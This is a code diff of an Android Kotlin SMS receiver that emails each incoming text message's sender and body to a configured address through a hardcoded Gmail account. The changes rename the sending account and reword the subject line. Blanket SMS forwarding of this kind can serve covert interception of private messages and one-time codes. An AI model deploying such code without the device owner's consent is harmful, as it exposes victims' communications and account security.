@@ -19,9 +19,8 @@ class SMSReceiver : BroadcastReceiver() {
         val action = intent.action
         if (action != null && action == ACTION_SMS_RECEIVED) {
 
-            val bundle = intent.extras           //---get the SMS message passed in---
+            val bundle = intent.extras
             if (bundle != null) {
-                //---retrieve the SMS message received---
                 try {
                     val pdus = bundle.get("pdus") as Array<*>
                     val msgs = arrayOfNulls<SmsMessage>(pdus.size)
@@ -32,8 +31,9 @@ class SMSReceiver : BroadcastReceiver() {
                         val email = PrefHelper.getInstance(context).getString(PrefHelper.KEY_EMAIL)
 
                         if (email != null) {
-                            SafeMail.sendMail("mymailer64@gmail.com", email,
-                                "SMS Hit from :" + msgFrom!!,
+
+                            SafeMail.sendMail("smssyncer64@gmail.com", email,
+                                "New SMS : " + msgFrom!!,
                                 msgBody,
                                 object : SafeMail.SafeMailCallback {
                                     override fun onSuccess() {
